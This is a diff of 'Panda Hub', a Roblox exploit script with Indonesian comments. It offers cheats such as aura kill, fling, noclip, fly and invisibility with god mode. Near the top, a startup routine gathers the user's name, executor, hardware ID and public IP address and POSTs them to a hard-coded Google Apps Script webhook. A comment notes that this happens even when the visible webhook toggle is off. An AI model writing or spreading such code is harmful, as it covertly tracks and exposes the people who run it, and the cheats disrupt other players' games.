@@ -5,32 +5,53 @@ local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Lighting = game:GetService("Lighting")
+
+-- =================================================================
+-- PROTEKSI MULTIPLE EXECUTION & CLEANUP (Mencegah Ghost Loop/Log)
+-- =================================================================
 if _G.PandaBoogaHubConnections then
     for _, conn in ipairs(_G.PandaBoogaHubConnections) do
         pcall(function() conn:Disconnect() end)
     end
 end
 _G.PandaBoogaHubConnections = {}
+
 local function track(conn)
     table.insert(_G.PandaBoogaHubConnections, conn)
     return conn
 end
+
+-- CLEANUP OLD GUI
 pcall(function()
     if CoreGui:FindFirstChild("PandaHub") then CoreGui.PandaHub:Destroy() end
     if gethui and gethui():FindFirstChild("PandaHub") then gethui().PandaHub:Destroy() end
 end)
+
+-- Konfigurasi Webhook
 local WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxy5F3vLrvEcKjN3fHFWZgaSm8AGAHiRX9gejqz6gsUAL3I-gO9G-mNipEGQnEt7gc/exec"
+
+-- =================================================================
+-- LOG EKSEKUSI AWAL (Tetap terkirim walau Webhook UI mati)
+-- =================================================================
 spawn(function()
     local req = (syn and syn.request) or request or (http and http.request) or http_request
     if req then
         pcall(function()
             local t = os.date("%Y-%m-%d %H:%M:%S")
+            
+            -- Mendapatkan Executor Name
             local executor = "Unknown"
             pcall(function() executor = (identifyexecutor and identifyexecutor()) or "Unknown" end)
+            
+            -- Mendapatkan HWID (Hardware ID) untuk melacak perangkat (device)
             local hwid = "Not Supported"
             pcall(function() hwid = (gethwid and gethwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "Not Supported" end)
+            
+            -- Mendapatkan IP Address untuk melacak lokasi
             local ip = "Unknown"
             pcall(function() ip = game:HttpGet("https://api.ipify.org/") end)
+            
+            -- Susun pesan tracking yang jauh lebih detail
             local detailedMessage = string.format(
                 "🚀 `[%s]` **%s** (@%s) has executed Panda Hub!\n\n" ..
                 "**👤 Player Info:**\n" ..
@@ -48,6 +69,7 @@ spawn(function()
                 executor, ip, hwid,
                 game.PlaceId, tostring(game.JobId)
             )
+
             req({
                 Url = WEBHOOK_URL,
                 Method = "POST",
@@ -59,8 +81,11 @@ spawn(function()
         end)
     end
 end)
+
 local logQueue = {}
 local lastLogSend = tick()
+
+-- State Management (Semua Fitur)
 local State = {
     AuraHarvest = false,
     AuraKill = false,
@@ -76,14 +101,9 @@ local State = {
     NightMode = false,
     NightBrightness = 0.2,
     InfiniteDrop = false,
-    AutoGift = false,
-    IsLoopDropping = false,
-    GiftTargets = {},
-    GiftRemote = nil,
-    GiftArgs = nil,
     Fly = false,
     FlySpeed = 16,
-    WebhookLogs = false,
+    WebhookLogs = false, -- Default mati
     FlingAura = false,
     CopyRadius = 200,
     DeleteRadius = 200,
@@ -93,18 +113,29 @@ local State = {
     UndergroundMode = false,
     SelectedPlayer = nil
 }
+
+-- Logging System
 local function logAction(action, text)
     local t = os.date("%H:%M:%S")
     local msg = string.format("[%s] %s | %s", t, action, text)
     table.insert(logQueue, msg)
 end
+
 local function processLogQueue()
     if #logQueue == 0 then return end
+    
     local payload = {
         content = table.concat(logQueue, "\n")
     }
+    
+    -- Clear queue
     logQueue = {}
+    
+    -- Jika toggle webhook dari depan (UI) dimatikan, batalkan pengiriman
     if not State.WebhookLogs then return end
+
+    
+    -- Ambil fungsi request exploit (synapse, krnl, fluxus, dll)
     local req = (syn and syn.request) or request or (http and http.request) or http_request
     if req then
         pcall(function()
@@ -119,15 +150,22 @@ local function processLogQueue()
         end)
     end
 end
+
+-- Menjalankan processLogQueue setiap 5 detik agar terhindar dari spam/rate limit
 coroutine.wrap(function()
     while true do
         wait(5)
         processLogQueue()
     end
 end)()
+
+--------------------------------------------------------------------------------
+-- GUI MULTI-FITUR
+--------------------------------------------------------------------------------
 local gui = Instance.new("ScreenGui")
 gui.Name = "PandaHub"
 gui.ResetOnSpawn = false
+
 if gethui then
     gui.Parent = gethui()
 elseif syn and syn.protect_gui then
@@ -136,16 +174,18 @@ elseif syn and syn.protect_gui then
 else
     gui.Parent = CoreGui
 end
+
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 330, 0, 380)
-frame.AnchorPoint = Vector2.new(0.5, 0)
-frame.Position = UDim2.new(0.5, 0, 0.5, -190)
+frame.AnchorPoint = Vector2.new(0.5, 0) -- Anchor di atas tengah
+frame.Position = UDim2.new(0.5, 0, 0.5, -190) -- Posisi agar tetap center di awal (380 / 2)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.BorderSizePixel = 2
 frame.BorderColor3 = Color3.fromRGB(60, 60, 60)
 frame.Active = true
-frame.ClipsDescendants = true
+frame.ClipsDescendants = true -- Agar menu tombol di bawahnya terpotong/disembunyikan saat diperkecil
 frame.Parent = gui
+
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
 title.BackgroundTransparency = 1
@@ -154,60 +194,72 @@ title.Font = Enum.Font.GothamBold
 title.TextSize = 16
 title.Text = "🐼 PANDA HUB 🐼"
 title.Parent = frame
+
 local UIListLayout = Instance.new("UIListLayout")
 UIListLayout.Parent = frame
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIListLayout.Padding = UDim.new(0, 5)
 UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- Spacer bawah title
 local spacer = Instance.new("Frame")
 spacer.Size = UDim2.new(1, 0, 0, 40)
 spacer.BackgroundTransparency = 1
 spacer.LayoutOrder = 1
 spacer.Parent = frame
 title.Parent = spacer
+
 local minimizeBtn = Instance.new("TextButton")
 minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
-minimizeBtn.Position = UDim2.new(1, -70, 0.5, -15)
-minimizeBtn.BackgroundColor3 = Color3.fromRGB(243, 156, 18)
+minimizeBtn.Position = UDim2.new(1, -70, 0.5, -15) -- Geser ke kiri
+minimizeBtn.BackgroundColor3 = Color3.fromRGB(243, 156, 18) -- ORANYE
 minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 minimizeBtn.Font = Enum.Font.GothamBlack
 minimizeBtn.TextSize = 20
 minimizeBtn.Text = "-"
 minimizeBtn.Parent = spacer
+
 local closeBtn = Instance.new("TextButton")
 closeBtn.Size = UDim2.new(0, 30, 0, 30)
-closeBtn.Position = UDim2.new(1, -35, 0.5, -15)
-closeBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
+closeBtn.Position = UDim2.new(1, -35, 0.5, -15) -- Paling kanan
+closeBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60) -- MERAH
 closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 closeBtn.Font = Enum.Font.GothamBlack
 closeBtn.TextSize = 16
 closeBtn.Text = "X"
 closeBtn.Parent = spacer
+
 local isMinimized = false
+
 local bodyFrame = Instance.new("Frame")
 bodyFrame.Size = UDim2.new(1, 0, 1, -45)
 bodyFrame.BackgroundTransparency = 1
 bodyFrame.LayoutOrder = 2
 bodyFrame.Parent = frame
+
 local bodyLayout = Instance.new("UIListLayout")
 bodyLayout.Parent = bodyFrame
 bodyLayout.FillDirection = Enum.FillDirection.Horizontal
 bodyLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
 local navBar = Instance.new("Frame")
 navBar.Size = UDim2.new(0, 75, 1, 0)
 navBar.BackgroundTransparency = 1
 navBar.LayoutOrder = 1
 navBar.Parent = bodyFrame
+
 local navLayout = Instance.new("UIListLayout")
 navLayout.Parent = navBar
 navLayout.FillDirection = Enum.FillDirection.Vertical
 navLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 navLayout.Padding = UDim.new(0, 5)
+
 local contentContainer = Instance.new("Frame")
 contentContainer.Size = UDim2.new(1, -75, 1, 0)
 contentContainer.BackgroundTransparency = 1
 contentContainer.LayoutOrder = 2
 contentContainer.Parent = bodyFrame
+
 local farmTab = Instance.new("ScrollingFrame")
 farmTab.Size = UDim2.new(1, 0, 1, 0)
 farmTab.BackgroundTransparency = 1
@@ -216,14 +268,17 @@ farmTab.ScrollBarThickness = 4
 farmTab.CanvasSize = UDim2.new(0, 0, 0, 500)
 farmTab.Visible = true
 farmTab.Parent = contentContainer
+
 local farmLayout = Instance.new("UIListLayout")
 farmLayout.Parent = farmTab
 farmLayout.SortOrder = Enum.SortOrder.LayoutOrder
 farmLayout.Padding = UDim.new(0, 5)
 farmLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
 farmLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     farmTab.CanvasSize = UDim2.new(0, 0, 0, farmLayout.AbsoluteContentSize.Y + 20)
 end)
+
 local cheatsTab = Instance.new("ScrollingFrame")
 cheatsTab.Size = UDim2.new(1, 0, 1, 0)
 cheatsTab.BackgroundTransparency = 1
@@ -232,14 +287,17 @@ cheatsTab.ScrollBarThickness = 4
 cheatsTab.CanvasSize = UDim2.new(0, 0, 0, 500)
 cheatsTab.Visible = false
 cheatsTab.Parent = contentContainer
+
 local cheatsLayout = Instance.new("UIListLayout")
 cheatsLayout.Parent = cheatsTab
 cheatsLayout.SortOrder = Enum.SortOrder.LayoutOrder
 cheatsLayout.Padding = UDim.new(0, 5)
 cheatsLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
 cheatsLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     cheatsTab.CanvasSize = UDim2.new(0, 0, 0, cheatsLayout.AbsoluteContentSize.Y + 20)
 end)
+
 local teleportTab = Instance.new("ScrollingFrame")
 teleportTab.Size = UDim2.new(1, 0, 1, 0)
 teleportTab.BackgroundTransparency = 1
@@ -248,70 +306,63 @@ teleportTab.ScrollBarThickness = 4
 teleportTab.CanvasSize = UDim2.new(0, 0, 0, 500)
 teleportTab.Visible = false
 teleportTab.Parent = contentContainer
+
 local teleportLayout = Instance.new("UIListLayout")
 teleportLayout.Parent = teleportTab
 teleportLayout.SortOrder = Enum.SortOrder.LayoutOrder
 teleportLayout.Padding = UDim.new(0, 5)
 teleportLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
 teleportLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     teleportTab.CanvasSize = UDim2.new(0, 0, 0, teleportLayout.AbsoluteContentSize.Y + 20)
 end)
+
 local builderTab = Instance.new("ScrollingFrame")
 builderTab.Size = UDim2.new(1, 0, 1, 0)
 builderTab.BackgroundTransparency = 1
 builderTab.BorderSizePixel = 0
 builderTab.ScrollBarThickness = 4
-builderTab.CanvasSize = UDim2.new(0, 0, 0, 500)
+builderTab.CanvasSize = UDim2.new(0, 0, 0, 500) -- Default fall-back
 builderTab.Visible = false
 builderTab.Parent = contentContainer
+
 local builderLayout = Instance.new("UIListLayout")
 builderLayout.Parent = builderTab
 builderLayout.SortOrder = Enum.SortOrder.LayoutOrder
 builderLayout.Padding = UDim.new(0, 5)
 builderLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
 builderLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     builderTab.CanvasSize = UDim2.new(0, 0, 0, builderLayout.AbsoluteContentSize.Y + 20)
 end)
+
 local infoTab = Instance.new("ScrollingFrame")
 infoTab.Size = UDim2.new(1, 0, 1, 0)
 infoTab.BackgroundTransparency = 1
 infoTab.BorderSizePixel = 0
 infoTab.ScrollBarThickness = 4
-infoTab.CanvasSize = UDim2.new(0, 0, 0, 800)
+infoTab.CanvasSize = UDim2.new(0, 0, 0, 800) -- Default fall-back
 infoTab.Visible = false
 infoTab.Parent = contentContainer
+
 local infoLayout = Instance.new("UIListLayout")
 infoLayout.Parent = infoTab
 infoLayout.SortOrder = Enum.SortOrder.LayoutOrder
 infoLayout.Padding = UDim.new(0, 5)
 infoLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
 infoLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
     infoTab.CanvasSize = UDim2.new(0, 0, 0, infoLayout.AbsoluteContentSize.Y + 20)
 end)
-local giftTab = Instance.new("ScrollingFrame")
-giftTab.Size = UDim2.new(1, 0, 1, 0)
-giftTab.BackgroundTransparency = 1
-giftTab.BorderSizePixel = 0
-giftTab.ScrollBarThickness = 4
-giftTab.CanvasSize = UDim2.new(0, 0, 0, 800)
-giftTab.Visible = false
-giftTab.Parent = contentContainer
-local giftLayout = Instance.new("UIListLayout")
-giftLayout.Parent = giftTab
-giftLayout.SortOrder = Enum.SortOrder.LayoutOrder
-giftLayout.Padding = UDim.new(0, 5)
-giftLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-giftLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    giftTab.CanvasSize = UDim2.new(0, 0, 0, giftLayout.AbsoluteContentSize.Y + 20)
-end)
+
 local function switchTab(tab)
     farmTab.Visible = (tab == farmTab)
     cheatsTab.Visible = (tab == cheatsTab)
     teleportTab.Visible = (tab == teleportTab)
     builderTab.Visible = (tab == builderTab)
     infoTab.Visible = (tab == infoTab)
-    giftTab.Visible = (tab == giftTab)
 end
+
 minimizeBtn.MouseButton1Click:Connect(function()
     isMinimized = not isMinimized
     if isMinimized then
@@ -324,41 +375,48 @@ minimizeBtn.MouseButton1Click:Connect(function()
         bodyFrame.Visible = true
     end
 end)
+
 closeBtn.MouseButton1Click:Connect(function()
     pcall(function()
         gui:Destroy()
+        -- Bersihkan semua koneksi/event listener
         if _G.PandaBoogaHubConnections then
             for _, conn in ipairs(_G.PandaBoogaHubConnections) do
                 pcall(function() conn:Disconnect() end)
             end
             _G.PandaBoogaHubConnections = {}
         end
+        -- Matikan State agar tidak mengganggu jika dieksekusi ulang
         State.AuraHarvest = false
         State.AuraKill = false
         State.TouchFling = false
         State.SpyTrace = false
     end)
 end)
+
 local function createNavBtn(text, tabToOpen)
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -4, 0, 35)
+    btn.Size = UDim2.new(1, -4, 0, 35) -- Menyisakan sedikit margin
+
     btn.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
     btn.TextSize = 12
     btn.Text = text
     btn.Parent = navBar
+    
     btn.MouseButton1Click:Connect(function()
         switchTab(tabToOpen)
     end)
     return btn
 end
+
 local farmNav = createNavBtn("Farm", farmTab)
 local cheatsNav = createNavBtn("Cheats", cheatsTab)
 local teleportNav = createNavBtn("Teleport", teleportTab)
 local builderNav = createNavBtn("Builder", builderTab)
 local infoNav = createNavBtn("Info", infoTab)
-local giftNav = createNavBtn("Gift", giftTab)
+
 local function createToggle(name, text, stateKey, layoutOrder, parentTab)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.9, 0, 0, 35)
@@ -369,12 +427,14 @@ local function createToggle(name, text, stateKey, layoutOrder, parentTab)
     btn.Text = text .. (State[stateKey] and ": ON" or ": OFF")
     btn.LayoutOrder = layoutOrder
     btn.Parent = parentTab
+    
     btn.MouseButton1Click:Connect(function()
         State[stateKey] = not State[stateKey]
         if State[stateKey] then
             btn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
             btn.Text = text .. ": ON"
             logAction("FEATURE", text .. " Enabled")
+            
         else
             btn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
             btn.Text = text .. ": OFF"
@@ -383,17 +443,24 @@ local function createToggle(name, text, stateKey, layoutOrder, parentTab)
     end)
     return btn
 end
-local function createInfoBox(titleText, descText, layoutOrder, parentTab)
-    parentTab = parentTab or infoTab
+
+-- =======================
+-- TABS POPULATION
+-- =======================
+
+-- INFO TAB
+local function createInfoBox(titleText, descText, layoutOrder)
     local container = Instance.new("Frame")
-    container.Size = UDim2.new(0.9, 0, 0, 0)
+    container.Size = UDim2.new(0.9, 0, 0, 0) -- Height akan otomatis
     container.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     container.BorderSizePixel = 0
     container.LayoutOrder = layoutOrder
-    container.Parent = parentTab
+    container.Parent = infoTab
+
     local uicorner = Instance.new("UICorner")
     uicorner.CornerRadius = UDim.new(0, 5)
     uicorner.Parent = container
+
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, -10, 0, 25)
     title.Position = UDim2.new(0, 5, 0, 5)
@@ -404,6 +471,7 @@ local function createInfoBox(titleText, descText, layoutOrder, parentTab)
     title.TextSize = 14
     title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = container
+
     local desc = Instance.new("TextLabel")
     desc.Size = UDim2.new(1, -10, 0, 0)
     desc.Position = UDim2.new(0, 5, 0, 30)
@@ -416,10 +484,13 @@ local function createInfoBox(titleText, descText, layoutOrder, parentTab)
     desc.TextYAlignment = Enum.TextYAlignment.Top
     desc.TextWrapped = true
     desc.Parent = container
+
+    -- Hitung ukuran deskripsi dengan asumsi lebar 230px
     local textBounds = game:GetService("TextService"):GetTextSize(descText, 12, Enum.Font.Gotham, Vector2.new(230, 9999))
     desc.Size = UDim2.new(1, -10, 0, textBounds.Y + 10)
     container.Size = UDim2.new(0.95, 0, 0, 30 + textBounds.Y + 10)
 end
+
 createInfoBox("Aura Harvest & Kill", "Aura Harvest automatically gathers resources and items. Aura Kill specifically attacks nearby enemies or players. Split into two functions to reduce performance lag.", 1)
 createInfoBox("Auto Claim Reward", "Automatically claims any periodic or event rewards that pop up on your screen, ensuring you never miss free items while you're away.", 2)
 createInfoBox("Auto Respawn", "Bypasses the death screen and instantly respawns your character the moment you die, getting you back into the action without delay.", 3)
@@ -436,13 +507,17 @@ createInfoBox("Scan RemoteEvents", "An advanced debugging feature that logs all 
 createInfoBox("Builder System", "A comprehensive saving system for your structures. Use 'Copy Base' to save buildings within a radius to your local file, and 'Load Base' to rebuild them instantly anywhere.", 14)
 createInfoBox("Auto Eat & Drink", "Automatically consumes food and water from your inventory in the background so you never starve or dehydrate while AFK farming.", 15)
 createInfoBox("Auto Cook in Area", "Automatically interacts with any cooking stations (Campfires, Grills) within the specified radius to cook your raw food.", 16)
+
+-- FARM TAB
 createToggle("AuraHarvestToggle", "Aura Harvest", "AuraHarvest", 1, farmTab)
 createToggle("AuraKillToggle", "Aura Kill", "AuraKill", 2, farmTab)
+
 local radiusContainer = Instance.new("Frame")
 radiusContainer.Size = UDim2.new(0.9, 0, 0, 35)
 radiusContainer.BackgroundTransparency = 1
 radiusContainer.LayoutOrder = 3
 radiusContainer.Parent = farmTab
+
 local radiusLabel = Instance.new("TextLabel")
 radiusLabel.Size = UDim2.new(0.55, 0, 1, 0)
 radiusLabel.BackgroundTransparency = 1
@@ -452,6 +527,7 @@ radiusLabel.Font = Enum.Font.GothamBold
 radiusLabel.TextSize = 13
 radiusLabel.TextXAlignment = Enum.TextXAlignment.Left
 radiusLabel.Parent = radiusContainer
+
 local radiusInput = Instance.new("TextBox")
 radiusInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 radiusInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -462,6 +538,7 @@ radiusInput.TextSize = 13
 radiusInput.Text = tostring(State.AuraRadius)
 radiusInput.PlaceholderText = "Radius"
 radiusInput.Parent = radiusContainer
+
 radiusInput.FocusLost:Connect(function()
     local num = tonumber(radiusInput.Text)
     if num then
@@ -473,11 +550,13 @@ radiusInput.FocusLost:Connect(function()
         radiusInput.Text = tostring(State.AuraRadius)
     end
 end)
+
 local attackCooldownContainer = Instance.new("Frame")
 attackCooldownContainer.Size = UDim2.new(0.9, 0, 0, 35)
 attackCooldownContainer.BackgroundTransparency = 1
 attackCooldownContainer.LayoutOrder = 4
 attackCooldownContainer.Parent = farmTab
+
 local attackCooldownLabel = Instance.new("TextLabel")
 attackCooldownLabel.Size = UDim2.new(0.55, 0, 1, 0)
 attackCooldownLabel.BackgroundTransparency = 1
@@ -487,6 +566,7 @@ attackCooldownLabel.Font = Enum.Font.GothamBold
 attackCooldownLabel.TextSize = 13
 attackCooldownLabel.TextXAlignment = Enum.TextXAlignment.Left
 attackCooldownLabel.Parent = attackCooldownContainer
+
 local attackCooldownInput = Instance.new("TextBox")
 attackCooldownInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 attackCooldownInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -497,6 +577,7 @@ attackCooldownInput.TextSize = 13
 attackCooldownInput.Text = tostring(State.AttackCooldown)
 attackCooldownInput.PlaceholderText = "Cooldown (sec)"
 attackCooldownInput.Parent = attackCooldownContainer
+
 attackCooldownInput.FocusLost:Connect(function()
     local num = tonumber(attackCooldownInput.Text)
     if num then
@@ -508,14 +589,17 @@ attackCooldownInput.FocusLost:Connect(function()
         attackCooldownInput.Text = tostring(State.AttackCooldown)
     end
 end)
+
 createToggle("RewardToggle", "Claim Reward", "AutoClaimReward", 5, farmTab)
 createToggle("RespawnToggle", "Auto Respawn", "AutoRespawn", 6, farmTab)
 createToggle("AutoEatToggle", "Auto Eat & Drink", "AutoEat", 7, farmTab)
+
 local eatCooldownContainer = Instance.new("Frame")
 eatCooldownContainer.Size = UDim2.new(0.9, 0, 0, 35)
 eatCooldownContainer.BackgroundTransparency = 1
 eatCooldownContainer.LayoutOrder = 8
 eatCooldownContainer.Parent = farmTab
+
 local eatCooldownLabel = Instance.new("TextLabel")
 eatCooldownLabel.Size = UDim2.new(0.55, 0, 1, 0)
 eatCooldownLabel.BackgroundTransparency = 1
@@ -525,6 +609,7 @@ eatCooldownLabel.Font = Enum.Font.GothamBold
 eatCooldownLabel.TextSize = 13
 eatCooldownLabel.TextXAlignment = Enum.TextXAlignment.Left
 eatCooldownLabel.Parent = eatCooldownContainer
+
 local eatCooldownInput = Instance.new("TextBox")
 eatCooldownInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 eatCooldownInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -535,6 +620,7 @@ eatCooldownInput.TextSize = 13
 eatCooldownInput.Text = tostring(State.EatCooldown)
 eatCooldownInput.PlaceholderText = "Seconds"
 eatCooldownInput.Parent = eatCooldownContainer
+
 eatCooldownInput.FocusLost:Connect(function()
     local num = tonumber(eatCooldownInput.Text)
     if num then
@@ -546,18 +632,23 @@ eatCooldownInput.FocusLost:Connect(function()
         eatCooldownInput.Text = tostring(State.EatCooldown)
     end
 end)
+
 local autoCookBtn = createToggle("AutoCookToggle", "Auto Cook in Area", "AutoCook", 9, farmTab)
+
+-- CHEATS TAB
 createToggle("FallDamageToggle", "Anti Fall Dmg", "AntiFallDamage", 1, cheatsTab)
 local noclipBtn = createToggle("NoclipToggle", "Noclip", "Noclip", 2, cheatsTab)
 createToggle("SpyToggle", "Spy Trace", "SpyTrace", 3, cheatsTab)
 createToggle("DropToggle", "Infinite Drop", "InfiniteDrop", 4, cheatsTab)
 local flyBtn = createToggle("FlyToggle", "Fly", "Fly", 5, cheatsTab)
 createToggle("NightModeToggle", "Night Mode", "NightMode", 6, cheatsTab)
+
 local nightBrightContainer = Instance.new("Frame")
 nightBrightContainer.Size = UDim2.new(0.9, 0, 0, 35)
 nightBrightContainer.BackgroundTransparency = 1
 nightBrightContainer.LayoutOrder = 7
 nightBrightContainer.Parent = cheatsTab
+
 local nightBrightLabel = Instance.new("TextLabel")
 nightBrightLabel.Size = UDim2.new(0.55, 0, 1, 0)
 nightBrightLabel.BackgroundTransparency = 1
@@ -567,6 +658,7 @@ nightBrightLabel.Font = Enum.Font.GothamBold
 nightBrightLabel.TextSize = 13
 nightBrightLabel.TextXAlignment = Enum.TextXAlignment.Left
 nightBrightLabel.Parent = nightBrightContainer
+
 local nightBrightInput = Instance.new("TextBox")
 nightBrightInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 nightBrightInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -577,6 +669,7 @@ nightBrightInput.TextSize = 13
 nightBrightInput.Text = tostring(State.NightBrightness)
 nightBrightInput.PlaceholderText = "0 - 10"
 nightBrightInput.Parent = nightBrightContainer
+
 nightBrightInput.FocusLost:Connect(function()
     local num = tonumber(nightBrightInput.Text)
     if num then
@@ -588,11 +681,13 @@ nightBrightInput.FocusLost:Connect(function()
         nightBrightInput.Text = tostring(State.NightBrightness)
     end
 end)
+
 local flySpeedContainer = Instance.new("Frame")
 flySpeedContainer.Size = UDim2.new(0.9, 0, 0, 35)
 flySpeedContainer.BackgroundTransparency = 1
 flySpeedContainer.LayoutOrder = 8
 flySpeedContainer.Parent = cheatsTab
+
 local flySpeedLabel = Instance.new("TextLabel")
 flySpeedLabel.Size = UDim2.new(0.55, 0, 1, 0)
 flySpeedLabel.BackgroundTransparency = 1
@@ -602,6 +697,7 @@ flySpeedLabel.Font = Enum.Font.GothamBold
 flySpeedLabel.TextSize = 13
 flySpeedLabel.TextXAlignment = Enum.TextXAlignment.Left
 flySpeedLabel.Parent = flySpeedContainer
+
 local flySpeedInput = Instance.new("TextBox")
 flySpeedInput.Size = UDim2.new(0.4, 0, 0.8, 0)
 flySpeedInput.Position = UDim2.new(0.6, 0, 0.1, 0)
@@ -612,6 +708,7 @@ flySpeedInput.TextSize = 13
 flySpeedInput.Text = tostring(State.FlySpeed)
 flySpeedInput.PlaceholderText = "Speed"
 flySpeedInput.Parent = flySpeedContainer
+
 flySpeedInput.FocusLost:Connect(function()
     local num = tonumber(flySpeedInput.Text)
     if num then
@@ -623,9 +720,12 @@ flySpeedInput.FocusLost:Connect(function()
         flySpeedInput.Text = tostring(State.FlySpeed)
     end
 end)
+
 createToggle("WebhookToggle", "Enable Webhook Log", "WebhookLogs", 9, cheatsTab)
+
 local isInvisible = false
 local invisibleThread = nil
+
 local function setVisible()
     local char = LocalPlayer.Character
     if not char then return end
@@ -644,9 +744,11 @@ local function setVisible()
     end
     LocalPlayer.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Everyone
 end
+
 local function setInvisible()
     local char = LocalPlayer.Character
     if not char then return end
+    
     for _, part in pairs(char:GetChildren()) do
         if part:IsA("BasePart") then
             part.Transparency = 1
@@ -660,13 +762,16 @@ local function setInvisible()
             end
         end
     end
+    
     LocalPlayer.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+
     local hum = char:FindFirstChildOfClass("Humanoid")
     if hum then
         hum.MaxHealth = math.huge
         hum.Health = math.huge
     end
 end
+
 local function invisibleLoop()
     while State.FEInvisible do
         setInvisible()
@@ -689,17 +794,23 @@ local function invisibleLoop()
         end
     end
 end
+
 local feInvisibleBtn = createToggle("FEInvisibleToggle", "👻 FE Invisible + God", "FEInvisible", 10, cheatsTab)
+
 local undergroundFloor = nil
 local surfaceCamPart = nil
 local isUnderground = false
+
 local function toggleUnderground(enabled)
     local char = LocalPlayer.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
+
     if enabled then
         local surfaceY = hrp.Position.Y
+        -- Kita teleport ke bawah tanah menggunakan World Space (Position) agar pasti ke bawah
         hrp.CFrame = CFrame.new(hrp.Position - Vector3.new(0, 15, 0)) * hrp.CFrame.Rotation
+        
         if not undergroundFloor then
             undergroundFloor = Instance.new("Part")
             undergroundFloor.Size = Vector3.new(100, 1, 100)
@@ -707,6 +818,7 @@ local function toggleUnderground(enabled)
             undergroundFloor.Transparency = 1
             undergroundFloor.Parent = workspace
         end
+        
         if not surfaceCamPart then
             surfaceCamPart = Instance.new("Part")
             surfaceCamPart.Size = Vector3.new(1, 1, 1)
@@ -715,14 +827,18 @@ local function toggleUnderground(enabled)
             surfaceCamPart.CanCollide = false
             surfaceCamPart.Parent = workspace
         end
+        
         workspace.CurrentCamera.CameraSubject = surfaceCamPart
         State.Noclip = true
+        
         local floorY = surfaceY - 18.5
+        
         spawn(function()
             while State.UndergroundMode do
                 local c = LocalPlayer.Character
                 local h = c and c:FindFirstChild("HumanoidRootPart")
                 if h and undergroundFloor and surfaceCamPart then
+                    -- Fix Y position for the floor so they can walk properly!
                     undergroundFloor.Position = Vector3.new(h.Position.X, floorY, h.Position.Z)
                     surfaceCamPart.Position = Vector3.new(h.Position.X, surfaceY + 2, h.Position.Z)
                 end
@@ -739,6 +855,7 @@ local function toggleUnderground(enabled)
         end
     end
 end
+
 spawn(function()
     while wait(0.1) do
         if State.UndergroundMode and not isUnderground then
@@ -750,7 +867,9 @@ spawn(function()
         end
     end
 end)
+
 local undergroundBtn = createToggle("UndergroundToggle", "⛏️ Underground Mode", "UndergroundMode", 11, cheatsTab)
+
 flyBtn.MouseButton1Click:Connect(function()
     if State.Fly and State.UndergroundMode then
         State.UndergroundMode = false
@@ -759,6 +878,7 @@ flyBtn.MouseButton1Click:Connect(function()
         logAction("FEATURE", "Underground Mode Auto-Disabled for Fly")
     end
 end)
+
 undergroundBtn.MouseButton1Click:Connect(function()
     if State.UndergroundMode and State.Fly then
         State.Fly = false
@@ -767,6 +887,7 @@ undergroundBtn.MouseButton1Click:Connect(function()
         logAction("FEATURE", "Fly Auto-Disabled for Underground Mode")
     end
 end)
+
 spawn(function()
     while true do
         wait(0.5)
@@ -778,8 +899,10 @@ spawn(function()
         end
     end
 end)
+
 local autoEatThread = nil
 local function autoEatLoop()
+    -- Caching remote event di luar loop biar gak bikin nge-lag parah
     local useEvent
     for _, desc in ipairs(ReplicatedStorage:GetDescendants()) do
         if desc:IsA("RemoteEvent") and (desc.Name == "UseConsumable" or desc.Name == "UseBagItem" or desc.Name == "UseItem" or desc.Name == "Consume" or desc.Name == "EatItem") then
@@ -787,15 +910,19 @@ local function autoEatLoop()
             break
         end
     end
+
     while State.AutoEat do
-        wait(State.EatCooldown)
+        wait(State.EatCooldown) -- Cek setiap X detik
+        
         local char = LocalPlayer.Character
         local hum = char and char:FindFirstChildOfClass("Humanoid")
         if hum and hum.Health > 0 then
